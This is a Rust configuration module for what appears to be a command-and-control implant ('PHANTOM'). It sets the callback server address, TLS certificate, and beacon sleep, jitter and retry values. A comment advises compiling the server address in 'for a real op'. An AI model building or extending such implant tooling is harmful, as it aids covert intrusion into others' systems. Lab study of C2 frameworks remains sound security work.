// config.rs — implant configuration
//
// env vars at runtime, or baked-in defaults at compile time.
// for a real op you'd want to compile the server address in via
// build.rs environment injection. for lab use, env vars are fine.
//
// PHANTOM_SERVER=192.168.1.10:4444 ./implant

pub struct Config {
    pub server_addr: String,  // host:port
    pub server_host: String,  // just the host, for TLS SNI
    pub ca_cert:     Option<String>,
    pub sleep_ms:    u64,
    pub jitter_pct:  u8,
    pub retry_secs:  u64,
}

impl Config {
    pub fn from_env_or_defaults() -> Self {
        let server = std::env::var("PHANTOM_SERVER")
            .unwrap_or_else(|_| "127.0.0.1:4444".to_owned());

        // extract just the host part for TLS SNI
        let server_host = server
            .split(':')
            .next()
            .unwrap_or("127.0.0.1")
            .to_owned();

        Config {
            server_addr: server,
            server_host,
            ca_cert:     std::env::var("PHANTOM_CA").ok(),
            sleep_ms:    parse_env("PHANTOM_SLEEP_MS",  5000),
            jitter_pct:  parse_env("PHANTOM_JITTER",    20),
            retry_secs:  parse_env("PHANTOM_RETRY",     30),
        }
    }
}

fn parse_env<T: std::str::FromStr>(key: &str, default: T) -> T {
    std::env::var(key)
        .ok()
        .and_then(|v| v.parse().ok())
        .unwrap_or(default)
}
// config
